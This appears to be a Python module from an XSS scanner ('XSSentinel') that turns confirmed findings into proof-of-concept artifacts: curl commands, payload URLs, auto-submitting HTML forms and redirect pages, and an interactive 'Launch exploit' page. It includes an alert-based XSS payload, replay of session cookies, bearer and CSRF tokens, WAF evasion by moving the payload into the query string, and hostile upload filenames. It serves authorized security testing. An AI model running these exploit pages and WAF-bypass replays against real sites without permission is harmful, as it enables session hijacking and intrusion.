"""Reproducible PoC generation for confirmed findings.

A finding is only useful if the tester can *reproduce* it.  For every confirmed
vulnerability we generate three ready-to-use artifacts:

  * ``curl``   - a copy-paste command that reproduces the request.
  * ``url``    - a ready GET URL with the payload in the parameter (GET only).
  * ``html``   - a self-contained HTML page that triggers the XSS when opened
                 in a browser (iframe / auto-submit form / location.hash for
                 DOM sources).  Hand this to a colleague or drop it on a host.

DOM findings store a *marker* (not a real exploit) as their payload, so we
substitute a canonical proof-of-execution payload (``alert(document.domain)``)
to make the PoC actually fire.
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse, quote

# Canonical proof-of-execution payload used for DOM PoC pages (clearly shows
# code execution without doing anything destructive).
DOM_POC_PAYLOAD = "<img src=x onerror=alert(document.domain)>"

# Findings whose stored payload is just a taint marker, not a real exploit.
_MARKER_TYPES = ("dom", "dom_dynamic")

# Session headers that must NOT be copied into a curl PoC (Phase 98):
# transport-control hops curl manages itself, and Cookie has its own
# replay channel (-b).  Everything else -- Authorization, X-API-Key,
# X-CSRF-Token, custom anti-bot headers, the (stealth) User-Agent --
# is exactly what an authenticated API target needs to replay.
_POC_HEADER_BLOCKLIST = frozenset({
    "host", "content-length", "content-type", "connection",
    "accept", "accept-encoding", "cookie",
})


def _poc_headers(headers: dict | None) -> dict:
    """Filter session headers down to the replay-worthy set (lowercased
    names de-duped against the blocklist; original casing preserved)."""
    out: dict = {}
    for k, v in (headers or {}).items():
        if str(k).lower() in _POC_HEADER_BLOCKLIST:
            continue
        if v is None:
            continue
        out[k] = str(v)
    return out


def _enc(s: str) -> str:
    return quote(s, safe="")


def _html_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


def build_poc(finding, csrf_fields: dict | None = None,
              cookies: dict | None = None,
              headers: dict | None = None) -> dict:
    """Return a PoC dict for a Finding (or its .data dict).

    Phase 48: two optional replay-context extras:
      * ``csrf_fields`` -- the original request's OTHER form fields
        (hidden CSRF tokens etc.) besides the injected one.  POST PoCs then
        replay the full body so CSRF-protected endpoints actually accept
        the request instead of 403ing on a single-parameter body.
      * ``cookies`` -- session cookie dict.  When given, the curl PoC
        carries ``-b`` so authenticated findings replay against the same
        session.  Optional and OFF by default (reports may be shared).
    Phase 98: ``headers`` -- session headers to replay as ``-H`` args
    (Authorization / X-API-Key / custom anti-bot headers ...).  This is
    the last leg of the authenticated-replay gap: a JSON API guarded by
    a bearer token 401s any cookie-less curl PoC, and cookies alone
    cannot carry it.  Transport-control headers and Cookie (its own
    ``-b`` channel) are filtered out.  Same opt-in default as cookies.
    """
    d = finding.data if hasattr(finding, "data") else finding
    csrf_fields = dict(csrf_fields or {})
    if not csrf_fields:
        csrf_fields = dict(d.get("csrf_fields") or {})
    cookies = dict(cookies or {})
    replay_headers = _poc_headers(headers)
    url = d.get("url") or ""
    method = (d.get("method") or "GET").upper()
    param = d.get("param")
    ftype = d.get("type")
    payload = d.get("payload") or ""
    if ftype in _MARKER_TYPES:
        poc_payload = DOM_POC_PAYLOAD
    else:
        poc_payload = payload

    poc: dict = {"curl": "", "url": "", "html": ""}
    if replay_headers:
        poc["replay_headers"] = dict(replay_headers)

    # --- request-level PoC (curl / ready URL) ---
    cookie_arg = ""
    if cookies:
        cookie_arg = " -b '" + "; ".join(f"{k}={v}" for k, v in cookies.items()) + "'"
    hdr_args = "".join(f" -H '{k}: {v}'" for k, v in replay_headers.items())
    # Phase 85: non-query carriers (transport-layer findings) -- the
    # payload lives in a header / cookie / the URL path, never in a query
    # parameter.  A query-param PoC would replay against the wrong carrier
    # (report.py Phase 56 fixed the same asymmetry for the burp exporter).
    import re as _re
    hdr_m = _re.match(r"^\(header:([^)]+)\)$", param or "")
    ck_m = _re.match(r"^\(cookie:([^)]+)\)$", param or "")
    path_like = param in ("(path)", "(error_path)")
    if hdr_m or ck_m or path_like:
        if hdr_m:
            hdr = f"{hdr_m.group(1)}: {_enc(poc_payload)}"
        elif ck_m:
            hdr = f"Cookie: {ck_m.group(1)}={_enc(poc_payload)}"
        else:
            # path/error-path carriers already embed the payload in the
            # URL itself (transport_layers wrote it into the finding URL).
            hdr = ""
            url_poc = url
        if not path_like:
            url_poc = url
        poc["url"] = url_poc
        cookie_arg = ""
        poc["curl"] = (f"curl -i '{url_poc}'"
                       + (f" -H '{hdr}'" if hdr else "") + hdr_args)
        poc["html"] = (
            f"<html><body>\n<!-- Non-query carrier ({'header' if hdr_m else 'cookie' if ck_m else 'path'}): "
            f"replay with the curl command. -->\n"
            f"<pre>{_html_escape(poc['curl'])}</pre>\n</body></html>")
        return poc

    # Phase 164: honour the carrier the scanner recorded.  Inferring it from
    # the method ("POST -> body") is wrong for every position-shift finding:
    # scanner._try_position_shift re-fires the payload into the OTHER location
    # to slip past a WAF that guards only the original one, so the shipped
    # curl put the payload in the one place the WAF inspects.  Measured on
    # pos-pshift-01: the PoC replayed into "Sorry, you have been blocked",
    # while `-X POST '<url>?q=<payload>'` returns 200 and reflects.
    param_in = str(d.get("param_in") or "").lower()
    if param:
        if param_in == "query" or method == "GET":
            p = urlparse(url)
            q = dict(parse_qsl(p.query, keep_blank_values=True))
            q[param] = poc_payload
            url_poc = urlunparse(p._replace(query=urlencode(q)))
            poc["url"] = url_poc
            if method == "GET":
                poc["curl"] = f"curl -i{cookie_arg}{hdr_args} '{url_poc}'"
            else:
                # POST whose payload rode the query: keep the method (the
                # endpoint may require it), send no body at all.
                poc["curl"] = (f"curl -i{cookie_arg}{hdr_args} -X {method} "
                               f"'{url_poc}'")
        elif (ftype in ("upload_xss", "stored_upload")):
            # Multipart upload finding: the payload lives in the FILE NAME,
            # so the curl replay must send a real multipart part with that
            # filename (@/dev/null = empty file content, the server only cares
            # about the name).  A browser cannot preset a filename, so the
            # HTML PoC (below) is a note.
            fld = param.replace("[filename]", "")
            poc["curl"] = (
                f"curl -i{cookie_arg}{hdr_args} -X POST '{url}' "
                f"-F '{fld}=@/dev/null;filename={_enc(poc_payload)}'")
        else:  # POST / other, payload in the body
            # Full body: the CSRF/hidden fields the endpoint required +
            # the injected parameter.  urlencode makes it shell-safe
            # inside single quotes (no raw quotes survive).
            body = dict(csrf_fields)
            body[param] = poc_payload
            body_qs = urlencode(body)
            poc["curl"] = (f"curl -i{cookie_arg}{hdr_args} -X {method} "
                           f"'{url}' --data '{body_qs}'")
    elif ftype == "cors_misconfig" and payload:
        # Phase 164: this finding has no injectable PARAMETER -- its carrier is
        # a request header -- so it fell into the "no parameter" branch and the
        # PoC was a placeholder ("no injectable parameter; open the HTML PoC
        # below") that reproduces nothing.  Measured on pos-cors-01: the
        # payload is the attacker Origin and the evidence already carries the
        # exact request, so ship that as the curl.
        poc["url"] = url
        # A HEADER value is not URL-encoded (the scanner sent it raw -- see
        # the finding's evidence), so percent-encoding it here would put a
        # mangled origin on the wire and a validating server would reject it.
        safe_origin = str(payload).replace("'", "")
        poc["curl"] = (f"curl -i{cookie_arg}{hdr_args} '{url}' "
                       f"-H 'Origin: {safe_origin}'")
        poc["html"] = (
            f"<html><body>\n"
            f"<!-- CORS misconfiguration: the server echoes the attacker "
            f"Origin in Access-Control-Allow-Origin -->\n"
            f"<pre>{_html_escape(poc['curl'])}</pre>\n</body></html>")
        return poc
    else:
        # No parameter (pure DOM sink via hash/cookie): the PoC is the HTML page.
        poc["curl"] = (f"# No injectable parameter; open the HTML PoC below "
                       f"(source: {d.get('context') or 'unknown'})")

    # --- HTML PoC page ---
    poc["html"] = _html_poc(d, url, method, param, poc_payload, ftype,
                            csrf_fields)
    return poc


def _html_poc(d, url, method, param, payload, ftype,
              csrf_fields: dict | None = None) -> str:
    esc = _html_escape
    csrf_fields = dict(csrf_fields or {})
    if ftype in _MARKER_TYPES:
        # DOM XSS: source is typically location.hash or location.search.
        ctx = (d.get("context") or "").lower()
        if "search" in ctx:
            target = f"{url}?xssv_probe={_enc(payload)}"
        else:
            target = f"{url}#{_enc(payload)}"
        return (f'<html><body>\n'
                f'<!-- DOM-XSS PoC: navigates the vulnerable page with the '
                f'payload in the taint source -->\n'
                f'<script>window.location.href="{esc(target)}";</script>\n'
                f'</body></html>')
    if str(d.get("param_in") or "").lower() == "query" and param:
        # Phase 164: the payload rode the QUERY (position-shift finding).  A
        # form would put it back in the body -- the one place the WAF guards,
        # which is why the shift exists.  Navigate with it in the URL instead.
        p = urlparse(url)
        q = dict(parse_qsl(p.query, keep_blank_values=True))
        q[param] = payload
        target = urlunparse(p._replace(query=urlencode(q)))
        return (f'<html><body>\n'
                f'<!-- payload rides the QUERY (position shift): a form would '
                f'put it back in the body the WAF inspects -->\n'
                f'<script>window.location.href="{esc(target)}";</script>\n'
                f'</body></html>')
    if ftype in ("upload_xss", "stored_upload"):
        # Browsers cannot preset a file input's filename, so the only
        # faithful reproduction of a filename-based upload XSS is the curl
        # multipart command (see build_poc).  The HTML page documents it.
        return (f'<html><body>\n'
                f'<!-- Upload-filename XSS cannot be reproduced by an HTML '
                f'page: a browser always sends the local file name.\n'
                f'     Use the curl PoC: multipart -F with the hostile '
                f'filename. -->\n'
                f'<p>Upload-filename XSS -- reproduce with the curl command '
                f'(a browser cannot preset a filename).</p>\n'
                f'</body></html>')
    if method == "POST" or ftype == "stored":
        # Auto-submit form reproduces a POST / stored injection.  Phase 48:
        # CSRF/hidden fields from the original request ride along as hidden
        # inputs -- without them CSRF-protected endpoints 403 the replay.
        hidden = ""
        for k, v in (csrf_fields or {}).items():
            hidden += (f'  <input type="hidden" name="{esc(k)}" '
                       f'value="{esc(v)}">\n')
        return (f'<html><body>\n'
                f'<form id="poc" action="{esc(url)}" method="{method}">\n'
                f'{hidden}'
                f'  <input name="{esc(param)}" value="{esc(payload)}">\n'
                f'</form>\n'
                f'<script>document.getElementById("poc").submit();</script>\n'
                f'</body></html>')
    if param:
        # Reflected GET: open the page with the payload in the URL.
        target = f"{url}?{param}={_enc(payload)}"
        return (f'<html><body>\n'
                f'<iframe src="{esc(target)}" '
                f'onload="window.location.href=\'{esc(target)}\'"></iframe>\n'
                f'<script>window.location.href="{esc(target)}";</script>\n'
                f'</body></html>')
    return (f'<html><body>\n<!-- no parameter; see curl above -->\n'
            f'</body></html>')


# ---------------------------------------------------------------------------
# Phase 14a: Interactive HTML PoC generator
# ---------------------------------------------------------------------------

def build_interactive_poc(finding) -> str:
    """Build a self-contained, interactive HTML PoC page for a finding.

    Unlike the minimal ``build_poc`` output (which just redirects/auto-
    submits), this page includes:

      * A header with the finding type, severity, and context.
      * A "Launch exploit" button that triggers the payload in a new tab.
      * The curl command for terminal reproduction (copy button).
      * The raw payload for inspection.
      * The compliance mapping (OWASP/CWE/PCI) for auditor context.
      * A "safe mode" notice explaining the page is for authorized
        testing only.

    The page is fully self-contained (no external CSS/JS) so it can be
    emailed, attached to a ticket, or dropped on any host.
    """
    d = finding.data if hasattr(finding, "data") else finding
    base_poc = build_poc(finding)
    url = d.get("url") or ""
    method = (d.get("method") or "GET").upper()
    param = d.get("param")
    ftype = d.get("type", "reflected")
    context = d.get("context", "")
    severity = d.get("severity", "info")
    payload = d.get("payload") or ""
    detail = d.get("detail") or ""
    poc_curl = base_poc.get("curl", "")
    poc_url = base_poc.get("url", "")
    poc_html = base_poc.get("html", "")

    esc = _html_escape
    sev_class = {"high": "sev-high", "critical": "sev-critical",
                 "medium": "sev-med", "low": "sev-low"}.get(severity, "sev-info")

    # Compliance mapping (Phase 14b).
    compliance_rows = ""
    try:
        from . import compliance as comp_mod
        entries = comp_mod.compliance_for_finding(d)
        if entries:
            rows = "".join(
                f"<tr><td>{esc(e['framework'])}</td>"
                f"<td>{esc(e['requirement_id'])}</td>"
                f"<td>{esc(e['title'])}</td>"
                f'<td><a href="{esc(e["url"])}" target="_blank">ref</a></td></tr>'
                for e in entries
            )
            compliance_rows = (
                '<section><h2>Compliance Mapping</h2>'
                '<table class="compliance"><thead><tr>'
                '<th>Framework</th><th>Requirement</th><th>Title</th>'
                '<th>Reference</th></tr></thead><tbody>'
                + rows + '</tbody></table></section>'
            )
    except Exception:
        pass

    # CVSS info if present.
    cvss_block = ""
    cvss_score = d.get("cvss_score")
    if cvss_score is not None:
        cvss_block = (
            f'<div class="cvss">CVSS v3.1: <strong>{esc(d.get("cvss_severity", ""))}</strong> '
            f'({esc(cvss_score)}) — Vector: <code>{esc(d.get("cvss_vector", ""))}</code></div>'
        )

    # Launch target: prefer the URL PoC (GET), otherwise the HTML PoC
    # (POST auto-submit / DOM redirect).
    launch_href = poc_url or "#"
    launch_onclick = ""
    if poc_url:
        launch_onclick = f' onclick="window.open(\'{esc(poc_url)}\', \'_blank\')"'
    elif poc_html and ("<script>" in poc_html or "<form" in poc_html):
        # Embed the auto-submit HTML in an iframe so the button "launches" it.
        import html as _html_mod
        encoded_html = _html_mod.escape(poc_html)
        launch_onclick = (
            ' onclick="document.getElementById(\'poc-frame\').'
            'srcdoc=decodeHtml(\'' + encoded_html.replace("'", "\\'") + '\')"'
        )

    return f"""<!doctype html>
<html lang="zh"><head><meta charset="utf-8">
<title>XSS PoC — {esc(ftype)} @ {esc(url)}</title>
<style>
  body {{font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;background:#f6f7fb;color:#1f2430;line-height:1.5}}
  header {{background:#1f2430;color:#fff;padding:20px 28px}}
  header h1 {{margin:0;font-size:18px}}
  header .meta {{color:#9aa3b2;font-size:13px;margin-top:4px}}
  .badge {{display:inline-block;padding:3px 10px;border-radius:4px;font-size:12px;font-weight:700;margin-left:8px}}
  .sev-high {{background:#e5484d;color:#fff}}
  .sev-critical {{background:#a02020;color:#fff}}
  .sev-med {{background:#f5a623;color:#fff}}
  .sev-low {{background:#3b82f6;color:#fff}}
  .sev-info {{background:#9aa3b2;color:#fff}}
  section {{padding:16px 28px}}
  section h2 {{font-size:15px;margin:0 0 8px;border-bottom:2px solid #eef0f4;padding-bottom:4px}}
  .info-grid {{display:grid;grid-template-columns:140px 1fr;gap:4px 12px;font-size:13px}}
  .info-grid dt {{color:#9aa3b2;font-weight:600}}
  .info-grid dd {{margin:0;word-break:break-all}}
  pre {{background:#1f2430;color:#e6e6e6;padding:12px;border-radius:6px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}}
  code {{background:#f3f4f8;padding:2px 4px;border-radius:4px;word-break:break-all}}
  .btn {{display:inline-block;padding:8px 18px;border-radius:6px;font-weight:700;font-size:14px;cursor:pointer;border:none;margin:4px 6px 4px 0}}
  .btn-launch {{background:#e5484d;color:#fff}}
  .btn-copy {{background:#3b82f6;color:#fff}}
  .btn:hover {{opacity:0.9}}
  table {{width:100%;border-collapse:collapse;background:#fff;border-radius:6px;overflow:hidden;font-size:12px}}
  th,td {{padding:6px 10px;border-bottom:1px solid #eef0f4;text-align:left}}
  th {{background:#f0f2f7}}
  .cvss {{font-size:13px;color:#9aa3b2;margin-top:6px}}
  #poc-frame {{width:100%;height:200px;border:1px solid #eef0f4;border-radius:6px;background:#fff}}
  .notice {{background:#fff8e1;border-left:4px solid #f5a623;padding:10px 14px;font-size:12px;color:#6b5b00;margin:0 28px 16px}}
  footer {{padding:14px 28px;color:#9aa3b2;font-size:11px}}
</style></head>
<body>
<header>
  <h1>XSS PoC — {esc(ftype)}
    <span class="badge {sev_class}">{esc(severity.upper())}</span>
  </h1>
  <div class="meta">{esc(url)} · {esc(method)} · param={esc(param)} · context={esc(context)}</div>
</header>

<div class="notice"><strong>Authorization notice:</strong> This PoC is for
use on systems you are authorized to test. Running it against
unauthorized targets may be illegal.</div>

<section>
  <h2>Exploit</h2>
  <p>Click the button to launch the exploit in a new tab:</p>
  <button class="btn btn-launch"{launch_onclick}>Launch exploit</button>
  <button class="btn btn-copy" onclick="copyCurl()">Copy curl command</button>
  <iframe id="poc-frame" style="display:none"></iframe>
</section>

<section>
  <h2>Vulnerability Details</h2>
  <dl class="info-grid">
    <dt>Type</dt><dd>{esc(ftype)}</dd>
    <dt>URL</dt><dd>{esc(url)}</dd>
    <dt>Method</dt><dd>{esc(method)}</dd>
    <dt>Parameter</dt><dd>{esc(param)}</dd>
    <dt>Context</dt><dd>{esc(context)}</dd>
    <dt>Severity</dt><dd>{esc(severity)}</dd>
    <dt>Confidence</dt><dd>{esc(d.get('confidence', ''))}</dd>
    <dt>Detail</dt><dd>{esc(detail)}</dd>
  </dl>
  {cvss_block}
</section>

<section>
  <h2>Payload</h2>
  <pre id="payload-text">{esc(payload)}</pre>
</section>

<section>
  <h2>curl Command</h2>
  <pre id="curl-text">{esc(poc_curl)}</pre>
</section>

{compliance_rows}

<footer>Generated by XSSentinel Interactive PoC Generator ·
Use only on systems you are authorized to test.</footer>

<script>
function copyCurl() {{
  var t = document.getElementById('curl-text').innerText;
  navigator.clipboard.writeText(t).then(function() {{
    alert('curl command copied to clipboard');
  }});
}}
function decodeHtml(s) {{
  var d = document.createElement('div');
  d.innerHTML = s;
  return d.textContent || d.innerText;
}}
</script>
</body></html>"""
